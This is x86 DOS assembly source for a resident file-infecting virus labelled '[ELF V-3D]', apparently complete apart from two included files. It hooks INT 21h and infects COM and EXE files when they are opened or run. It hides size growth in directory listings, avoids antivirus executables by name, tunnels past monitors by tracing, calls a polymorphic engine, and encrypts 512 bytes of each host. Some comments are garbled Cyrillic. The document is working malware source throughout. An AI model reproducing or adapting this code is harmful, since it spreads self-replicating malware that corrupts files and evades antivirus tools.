   mz  struc
           mzSignature  dw ?
           mzExtraBytes dw ?
           mzPages      dw ?
           mzRelocItems dw ?
           mzHeaderSize dw ?
           mzMinAlloc   dw ?
           mzMaxAlloc   dw ?
           mzInitSS     dw ?
           mzInitSP     dw ?
           mzCheckSum   dw ?
           mzInitIP     dw ?
           mzInitCS     dw ?
           mzRelocTable dw ?
           mzOverlay    dw ?
   ends

   dta  struc
           dtaFill db 21 dup (?)
           dtaAttr db ?
           dtaTime dd ?
           dtaSize dd ?
           dtaName db 13 dup (?)
   ends

   max_fsize = 50000
   dec_size  = ((vl+202+400)/16)+1
   IntConst  = 3h

   locals __
   .model tiny
   .code
   org 0h
   start:
   virus_start:
   save_all:
         .286
         call $+3
   delta:
         pop  bp
         sti
         cld
         sub  bp, offset delta
   install:
         mov  ax, 0CAFEh
         clc
         int  21h
         jc   exit
         mov  ax, 3305h
         int  21h
         cmp  dl, 3
         jb   exit
         call trace_int21
         jz   exit
         mov  ah, 62h
         int  21h
         mov  es, bx
         sub  bx, bx
         mov  ah, 4Ah
         dec  bx
         int  21h
         sub  bx, _vl/16+1+1
         mov  ah, 4Ah
         int  21h
         mov  bx, _vl/16+1
         mov  ah, 48h
         int  21h
         jc   exit
         mov  es, ax
         dec  ax
         mov  ds, ax
         sub  di, di
         mov  2 ptr ds:[di+1], 8
         mov  1 ptr ds:[di],  'Z'
         mov  cx, vl
         mov  si, bp
         rep  movs 1 ptr es:[di],cs:[si]
         Push Es
         Pop  Ds
         mov  ax, 3521h
         int  21h
         mov  2 ptr ds:[no_run+1+2],   bx
         mov  2 ptr ds:[no_run+1+2+2], es
         lea  dx, int_21
         Mov  Ax, 2521h
         int  21h

   include exit.inc

   int_21 proc
         cmp ax, 0CAFEh
         jnz no_dead
         stc
         retf 2
   no_dead:
         xchg al, ah
         cmp al, 00
         jnz no_exit
   __exit:
         mov byte ptr cs:[stealth], 0
         jmp no_run
   no_exit:
         cmp al, 4Ch
         jz  __exit
         cmp byte ptr cs:[stealth], 0
         jnz __exec
         cmp al, 4Eh
         jnz no_find_first
   find_file:
         xchg al, ah
         jmp find
   no_find_first:
         cmp al, 4Fh
         jz  find_file
   __exec:
         cmp al, 3Dh
         jz  _hehe
         cmp ax, 004Bh
         jnz no_run
   _hehe:
         Call Init
         Push Dx
         Call Cmp_Name
         inc  byte ptr cs:[stealth]
         jc   Err_Name
         dec  byte ptr cs:[stealth]
         Call test_Rash
         Jc   Err_Name
         mov  ah, 51h
         int  IntConst
         mov  es, bx
         mov  ah, 48h
         mov  bx, dec_size
         int  IntConst
         jc   Err_Name
         mov  cs:buf_seg, ax
         Pop  Dx
         Call infect
         mov  es, cs:buf_seg
         mov  ah, 49h
         int  IntConst
         jmp  $+1+2
   Err_Name:
         Pop Dx
         Call Done
   no_run:
         xchg al, ah
   sifilis:
         db 0eah
         dd 0
   int_21 endp

   infect proc
         mov byte ptr cs:[use_it], 60h
         mov ax, 4300h
         int IntConst
         jnc __1
   __4:
         ret
   __1:  push cx ds dx
         mov ax, 4301h
         sub cx, cx
         int IntConst
         jc __4
   __3:
         mov ax, 3d42h
         int IntConst
         xchg ax, bx
         Push Cs Cs
         Pop  Ds Es
         mov ax, 5700h
         int IntConst
         push cx dx
         mov di, dx
         mov ah, 2Ch
         int IntConst
         mov A, cx
         mov b, dx
         mov ah, 2Ah
         int IntConst
         xor dx, di
         and dx, 18h
         jz  $close
         lea dx, exe_header
         mov si, dx
         mov cx, 1Ch
         call read
         jc _close
         mov  al, [si+2]
         mov  1 ptr [LostBytes_2], al
         lodsw
         mov  2 ptr [LostBytes_1], ax
         not ax
         mul ah
         cmp ax, 72BAh
         jz  exe_filez
         call seek_end
         cmp  dx, 4
         ja   $$close
         call test_infect
   $close:
         jz  $$close
         mov fsize1, ax
         mov fsize2, dx
         dec dx
         jns close
         cmp ax, max_fsize
         ja  close
         cmp ax, 4000
         jb  close
         ; 512..fsize-(512+9)
         sub ax, 512+9
   _$7:  mov dx, ax
         call random
         xchg ax, dx
         cmp dx, 512
         jb  _$7
         mov 2 ptr ds:[OfsCom], dx
   _$8:
         mov ax, 100h
         call random
         or  ax, ax
         jz  _$8
         mov 1 ptr ds:[KeyCom], al
         call test_simbioz
   _close:
         jc __2
         call simbioz
   $$close:
         jmp close
   __2:  call _enuns
         jmp close
   exe_filez:
         call seek_end
         mov fsize1, ax
         mov fsize2, dx
         cmp dx, 1234h
         org $-2
         dw  (300*1024 shr 16)
         ja  close
         test dx, dx
         jnz __5
         cmp ax, 5000
         jb close
   __5:
         push ax dx
         sub ax, 512+9
   __7:  mov dx, ax
         call random
         xchg ax, dx
         cmp dx, 512
         jb  __7
         mov 2 ptr ds:[OfsCom], dx
   __8:
         mov ax, 100h
         call random
         or  ax, ax
         jz  __8
         mov 1 ptr ds:[KeyCom], al
         pop dx ax
         call test_infect
         jz  close
         call try_infect_exe
   close:
         pop dx cx
         mov ax, 5701h
         int IntConst
         mov ah, 3Eh
         int IntConst
   end_attr:
         pop dx ds cx
         mov ax, 4301h
         int IntConst
         ret
   infect endp

   test_infect:
         ; ax:dx - file size
         push ax dx
         mov cx, 101
         div cx
         test dx, dx
         pop dx ax
         ret

   test_simbioz proc
         lea si, exe_header
         mov cx, 1Ch
         mov al, [si]
         cmp al, 0E9h
         jz  err_check
         cmp al, 0EBh
         jz  err_check
         sub ah, ah
   no_0B8:
         lodsb
         cmp al, 0B9h
         jnz no_B9
         or  ah, 10b
         inc  si
         inc  si
         cmp  cl, 2
         jb   err_check
         dec  cx
         dec  cx
         jmp  no_B8
   no_B9:
         and al, not 1
         cmp al, 0FCh
         jnz no_FC
         mov dx, [si]
         and dh, not 1
         cmp dx, 0A4F3h
         jz  ok_find
   no_FC:
         and al, not 110b
         cmp al, 0B8h
         jnz no_B8
         inc si
         inc si
         or  ah, 1
         cmp cl, 2
         jb  err_check
         dec cx
         dec cx
   no_B8:
         loop no_0B8
         jcxz err_check
   ok_find:
         cmp ah, 11b
         jnz err_check
         ret
   err_check:
         stc
         ret
         endp

   simbioz proc
         mov  ax, 2 ptr [si-1]
         mov  2 ptr [LostBytes_1], ax
         mov  al, 1 ptr [si+1]
         mov  1 ptr [LostBytes_2], al
         mov  1 ptr [si-1], 0E8h
         push si
         mov  ax, fsize1
         add  ax, 100h
         call gen_body
         call virus_write
         pop  di
         jc   __1
         mov  dx, offset exe_header
         sub  dx, di
         neg  dx
         inc  dx
         inc  dx
         mov  ax, fsize1
         sub  ax, dx
         mov  2 ptr [di], ax
         call write_header
         jc    __1
         call crypt_com
   __1:
         ret
         endp

   _enuns proc
         mov ax, 4202h
         mov cx, -1
         mov dx, -7
         int IntConst
         lea dx, enun
         mov di, dx
         mov cx, 7
         call read
         jc __1
         lea si, Enuns
         mov cx, 5
         repe cmpsb
         jnz __1
         mov  ax, fsize1
         add  ax, 100h-7
         sub  fsize1, 7
         call gen_body
         mov  ax, cx
         sub  ax, 7
         add 2 ptr [enun+5], ax
         push cx
         mov ax, 4202h
         mov cx, -1
         mov dx, -7
         int IntConst
         pop cx
         push es ds
         push cx
         mov  es, 2 ptr cs:[buf_seg]
         mov  di, cx
         lea  si, enun
         mov  cx, 7
         sub  di, cx
         rep  movs 1 ptr es:[di], cs:[si]
         pop  cx
         call virus_write
         pop  ds es
         jc   __1
         call seek_beg
         mov ax, fsize1
         sub ax, 3
         mov 2 ptr [exe_header+1], ax
         mov 1 ptr [exe_header], 0E8h
         call write_header
   __1:
         ret
         endp

   virus_write:
         push ds
         mov  ds, 2 ptr cs:[buf_seg]
         mov  di, cx
         mov  ax, cs:fsize1
         mov  2 ptr ds:[di-11], ax
         mov  ax, cs:fsize2
         mov  2 ptr ds:[di-11+2], ax
         sub  dx, dx
         call write
         pop  ds
         ret

   try_infect_exe proc
         mov cx, 200h
         div cx
         test dx, dx
         jz  __2
         inc ax
   __2:
         lea si, exe_header
         cmp 2 ptr [si.mzPages], ax
         jz  __6
   __1:
         ret
   __6:
         cmp 2 ptr [si.mzExtraBytes], dx
         jnz __1
         sub ax, ax
         cmp 2 ptr [si.mzCheckSum], ax
         jnz __1
         cmp 2 ptr [si.mzRelocItems], ax
         jz  __1
         mov ax, [si.mzHeaderSize]
         mov HdrSize, ax
         cmp ax, 0FFFFh shr 4
         ja  __1
         mov cl, 4
         shl ax, cl
         cmp 2 ptr [si.mzRelocTable], ax
         jae  __1
         mov ax, [si.mzInitIP]
         mov OldIP, ax
         mov ax, [si.mzInitCS]
         mov OldCS, ax
         mov dx, [si.mzInitSS]
         cmp ax, dx
         jz  __1
         mov OldSS, dx
         mov ax, [si.mzInitSP]
         mov OldSP, ax
         mov ax, [si.mzRelocItems]
         mov 2 ptr [RelocNum], ax
         mov ax, [si.mzRelocTable]
         mov 2 ptr [RelocOfs], ax
         mov ax, fsize1
         mov dx, fsize2
         mov cx, 10h
         div cx
         sub ax, 2 ptr [si.mzHeaderSize]
         mov 2 ptr [si.mzInitCS], ax
         mov 2 ptr [si.mzInitIP], dx
         push ax
         mov ax, 2048 shr 4
         call random
         pop dx
         inc dx
         add ax, dx
         mov 2 ptr [si.mzInitSS], ax
         mov ax, 0FFFEh-0DE00h
         call random
         add ax, 0DE00h
         mov 2 ptr [si.mzInitSP], ax
         ; ¯à®¢¥àª  ¬®¦® «¨
         ; ¯à¥¢à é âì ¢ COM ä ©« ?
         ; ¨«¨ áâ ¤ àâ®¥ EXE ¨ä¨æ¨à®¢ ¨¥
         mov ax, fsize1
         mov dx, fsize2
         dec dx
         jns __4
         cmp ax, max_fsize
         ja  __4
         push si
         mov cx, 1Ch
   __3:
         mov byte ptr ds:[si], ch
         inc si
         loop __3
         mov byte ptr cs:[use_it], 90h
         pop di
         push di
         call gen_header
         pop dx
         mov al, 0E9h
         stosb
         mov ax, fsize1
         ; fsize1-(di-dx)-3
         sub ax, di
         add ax, dx
         sub ax, 2
         stosw
         mov  ax, fsize1
         add  ax, 100h
         call gen_body
         call virus_write
         jc  __7
         call write_header
         jc  __7
         jmp crypt_com
   __4:
         push si
         mov  ax, [si.mzInitIP]
         call gen_body
         call virus_write
         pop si
         jc __7
         mov ax, 4201h
         sub cx, cx
         cwd
         int IntConst
         mov cx, 200h
         div cx
         test dx, dx
         jz __5
         inc ax
   __5:  mov 2 ptr [si.mzPages], ax
         mov 2 ptr [si.mzExtraBytes], dx
         call write_header
   __7:
         ret
         endp

   gen_body:
         push es
         mov  es, 2 ptr cs:[buf_seg]
         sub  di, di
         sub  si, si
         mov  cx, (vl/2)+1
         push bx
         call engine
         pop  bx
         mov di, cx
         mov ax, fsize1
         mov dx, fsize2
         add ax, cx
         adc dx, 0
         mov cx, 101
         div cx
         sub dx, dx
         inc ax
         inc ax
         mul cx
         sub ax, fsize1
         push ax
         sub ax, di
         xchg ax, cx
   __1:
         mov ax, 100h
         call random
         stosb
         loop __1
         pop  cx
         pop  es
         ret

   test_rash:
         mov di, dx
         mov ax, [di-5]
         and ax, not 2020h
         mov dx, [di-5+2]
         and dx, not 2020h
         cmp ax, ('C' shl 8)+0Eh
         jnz not_com
         cmp dx, 'MO'
         jnz bad_bad
   _ex_check:
         ret
   not_com:
         cmp ax, ('E' shl 8)+0Eh
         jnz bad_bad
         cmp dx, 'EX'
         jz  _ex_check
   bad_bad:
         stc
         jmp _ex_check

   write_header:
         call seek_beg
         lea  dx, exe_header
         mov  cx, 1Ch
         jmp  write

   read:
         mov ah, 3Fh
         int IntConst
   t_write:
         jc  __1
         cmp ax, cx
         jz __1
         stc
   __1:
         ret
   write:
         mov ah, 40h
         int IntConst
         jmp t_write
   seek_beg:
         mov ax, 4200h
         sub cx, cx
         cwd
         int IntConst
         ret
   seek_end:
         mov ax, 4202h
         sub cx, cx
         cwd
         int IntConst
         ret

   random:
       push bx cx dx
       push ax
       mov ax, 0
       org $-2
   A   dw  0
       mov bx, 0
       org $-2
   B   dw  0
       mov cx, ax
       mov dx, 8405h
       mul dx
       shl cx, 3
       add ch, cl
       add dx, cx
       add dx, bx
       shl bx, 2
       add dx, bx
       add dh, bl
       mov cl, 5
       shl bx, cl
       add dh, bl
       add ax, 1
       adc dx, 0
       mov 2 ptr [A], ax
       mov 2 ptr [B], dx
       pop bx
       mov cx, dx
       mul bx
       mov ax, cx
       mov cx, dx
       mul bx
       add ax, cx
       adc dx, 0
       xchg ax, dx
       pop dx cx bx
       ret

       db '[ELF V-3D]'

   cmp_name:
         cld
         push ds
         pop  es
         mov  di, dx
         sub  al, al
         mov  cx, 41h
         cld
         repne scasb
         push di
         jcxz __4
         xchg ax, cx ; cx = ax
         mov cx, 41h
         sub cx, ax
         mov dx, di
   __6:
         cmp byte ptr [di-1], '\'
         jz  __5
         cmp byte ptr [di-1], ':'
         jz  __5
         dec di
         loop __6
   __5:
         mov dx, di
         lea si, bad_namez
   __2:
         lods byte ptr cs:[si]
         or al, al
         jz  __1
         mov cl, al
         sub ch, ch
         push si cx
         mov  di, dx
   __7:
         mov  ah, [di]
         and  ah, not 20h
         lods byte ptr cs:[si]
         inc  di
         cmp  ah, al
         jnz  __3
         loop __7
         pop cx si
   __4:
         stc
   __1:  pop dx
         ret
   __3:
         pop cx si
         add si, cx
         jmp __2

   bad_namez:
         db 3,'AID'
         db 5,'DRWEB'
         db 5,'ADINF'
         db 3,'AVP'
         db 3,'NDD'
         db 3,'SCA'
         db 4,'GOAT'
         db 0
   Enuns db 'ENUNS'

   Int24:
         Mov Al, 3
         Iret

   Init  Proc
         Pop 2 ptr cs:[_Ret]
         Push Ax Bx Dx Cx Si Di Bp
         Push Ds Es
         Mov Si, Dx
         Mov Di, Ds
         Mov Ax, 3524h
         PushF
         Push CS
         Call Int_3h
         Push Es Bx
         Mov Ax, 3503h
         PushF
         Push CS
         Call Int_3h
         Push Es Bx
         Push Cs
         Pop  Ds
         Lea  Dx, Int_3h
         Mov  Ax, 2503h
         PushF
         Push CS
         Call Int_3h
         Mov  Ax, 2524h
         Lea  Dx, Int24
         Int  3h
         Mov  Ds, Di
         Mov  Dx, Si
         jmp  2 ptr cs:[_Ret]
         Endp

   Done  Proc
         Pop  2 ptr cs:[_Ret]
         Pop  Dx Ds
         Mov  Ax, 2503h
         Int  3H
         Pop  Dx Ds
         Mov  Ax, 2524h
         PushF
         Push CS
         Call Int_3h
         Pop  Es Ds
         Pop  Bp Di Si Cx Dx Bx Ax
         jmp  2 ptr cs:[_Ret]
         Endp

   ; ¢¨àì è¨äàã¥â 512 ¡ ©â ¢ ä ©«¥

   crypt_com:
         push ds
         mov  ds, 2 ptr cs:[buf_seg]
         mov  ax, 4200h
         sub  cx, cx
         mov  dx, 0
         org  $-2
   OfsCom     dw 0FB00h
         int  IntConst
         mov  cx, 512
         sub  dx, dx
         call read
         jc   __1
         sub  si, si
         mov  al, 0
         org  $-1
   KeyCom     db 0
   __2:
         xor  1 ptr ds:[si], cl
         sub  1 ptr ds:[si], al
         sub  al, cl
         inc  si
         loop __2
         mov  ax, 4200h
         mov  dx, cs:OfsCom
         int  IntConst
         mov  cx, 512
         sub  dx, dx
         call write
   __1:
         pop  ds
         ret

   int_3h:
         db 0eah
   dos_ofs_21 dw 0
   dos_seg_21 dw 0

   trace:
          ; pushf
          ; push cs
          ; push ip
          push bp
          mov  bp, sp
          push ax
          push si
          call $+3
   delta1:
          pop  si
          sub  si, offset delta1
          db   0B8h
   dos_seg     dw 0
          db   36h
          cmp  ax, [bp+2+2]
          jnz  not_me
          mov  2 ptr cs:[dos_seg_21+si], ax
          db   36h
          mov  ax, [bp+2]
          mov  2 ptr cs:[dos_ofs_21+si], ax
          pop  si
          pop  ax
          pop  bp
          inc  si
          retf 2
   not_me:
          pop  si
          pop  ax
          pop  bp
          iret

   trace_int21:
          mov ax, 3501h
          int 21h
          push es bx cs
          pop ds
          lea dx, [bp+trace]
          mov ax, 2501h
          int 21h
          mov ah, 52h
          int 21h
          mov 2 ptr cs:[bp+dos_seg], es
          pushf
          pushf
          pop ax
          or  ax, 100h
          push ax
          popf
          sub si, si
          mov es, si
          mov ah, 30h
          call 4 ptr es:[21h*4]
          pop dx ds
          mov ax, 2501h
          int 21h
          test si, si
          ret

   find   proc
          ; pushf
          ; push cs
          ; push ip
          pushf
          push  cs
          call  sifilis
          jc    __Err
          pushf
          call  init
          mov   ah, 2Fh
          int   IntConst
          push  es
          pop   ds
          mov   ax, 2 ptr [bx.dtaSize]
          mov   dx, 2 ptr [bx.dtaSize+2]
          cmp   dx, 5
          ja    _done
          call  test_infect
          jnz   _done
          mov   di, bx
          lea   dx, [bx.dtaName]
          mov   ax, 3DC0h
          int   IntConst
          jc    _done
          xchg  ax, bx
          mov   ax, 4202h
          mov   cx, -1
          mov   dx, -11
          int   IntConst
          mov   cx, 4
          lea   dx, fsize1
          push  cs
          pop   ds
          call  read
          jc    __close
          mov   ax, fsize2
          cmp   ax, 2 ptr es:[di.dtaSize+2]
          ja    __close
          mov   2 ptr es:[di.dtaSize+2], ax
          mov   ax, fsize1
          mov   2 ptr es:[di.dtaSize],   ax
   __close:
          mov   ah, 3Eh
          int   IntConst
   _done:
          call  done
          popf
   __Err:
          Retf  2
   find   endp

   garbage:
          db 10001011b
          db 00000011b
          db 00010011b
          db 00100011b
          db 00001011b
          db 00101011b
          db 00011011b
          db 00110011b
          db 10000101b
          db 00111011b
   len_garbage = ($-garbage)

   gen_header proc
          mov ax, 6
          call random
          xchg ax, cx
          jcxz __1
   __2:
          call gen_byte
          loop __2
   __1:   mov al, 60h
          stosb
          mov ax, 8
          call random
          inc ax
          xchg ax, cx
   __3:   lea si, garbage
          mov ax, len_garbage
          call random
          add si, ax
          lodsb
          stosb
   __4:
          mov ax, 100h
          call random
          mov ah, al
          and ah, 00111000b
          cmp ah, 00100000b
          jz  __4
          or  al, 11000000b
          stosb
          loop __3
          ret
   gen_header endp

   one_byte:
       clc
       cld
       cli
       cmc
       sti
       nop
       stc
       std
       sahf
   ob_len = ($-one_byte)

   include engine.inc

   vl = ($-start)

   buffer:

   exe_header db 1Ch dup (?)
   fsize1     dw ?
   fsize2     dw ?
   Enun       db 7 dup (?)
   stealth    db ?
   _ret       dw ?
   buf_seg    dw ?

   _vl = ($-start)
   end start
